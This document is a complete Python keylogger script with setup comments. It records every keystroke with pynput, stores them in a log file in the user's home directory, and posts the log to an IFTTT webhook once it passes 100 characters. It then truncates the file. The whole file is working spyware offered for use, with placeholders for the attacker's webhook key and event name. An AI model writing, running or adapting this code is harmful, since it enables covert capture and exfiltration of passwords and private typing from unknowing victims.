#!/usr/bin/env python3

from pynput.keyboard import Listener
import socket
import os
import pwd
import requests

'''
The logfile location may vary upon the user which is running
the software. With that in mind, i wrote this function to harvest
this info and use it during runtime
'''
userdata = pwd.getpwuid(os.getuid())
# retorna uma lista com alguns dados interessantes :v
username = userdata[0]
logFile = userdata[5] + '/log'


key = "Your IFTTT Webhooks' key here"
event = "The event name you've created"


url = "https://maker.ifttt.com/trigger/" + event + "/with/key/" + key

#Debug. Did you do this step properly?
#print(url)

def request():
	with open(logFile, "r+") as file:
		log = file.read()
		if len(log) > 100:
			payload = {"value1":log}
			r = requests.post(url, data=payload)
			if r.status_code == 200:
				file.truncate(0)
			else:
				print(r.status_code)
def writeLog(key):
	keydata = str(key)

	'''
writeLog() is the "main" function.
It reads the pressed keystrokes via listener and write them to a temporary log file
If you want, you can edit the program to erase this log file in case of a unexpected exit. Good luck :)

This is a dictionary to translate some of the key presses returned by the listener

'''
	translate_keys = {
		"Key.space": " ",
		"Key.shift_r": "[SHIFT]",
		"Key.shift_l": "[SHIFT]",
		"Key.enter": "\n",
		"Key.alt": "[ALT]",
		"Key.esc": "[ESC]",
		"Key.cmd": "[CMD]",
		"Key.caps_lock": "[CAPS]",
		"Key.backspace": "[BACKSPACE]",
		"Key.tab": "[TAB]",
		"Key.ctrlc":"[CTRL+C]"
	}



	'''
	it removes those annoying quotes from every character
	'''

	keydata = keydata.replace("'", "")

	#Checks if any translation is needed

	for key in translate_keys:
		keydata = keydata.replace(key, translate_keys[key])

	#Opens file in append mode
	with open(logFile, "a") as file:
		file.write(keydata)
		request()

#This is the event listener which cheks the keystrokes and call the function writeLog() if any

while True:
	with Listener(on_press=writeLog) as l:
		l.join()
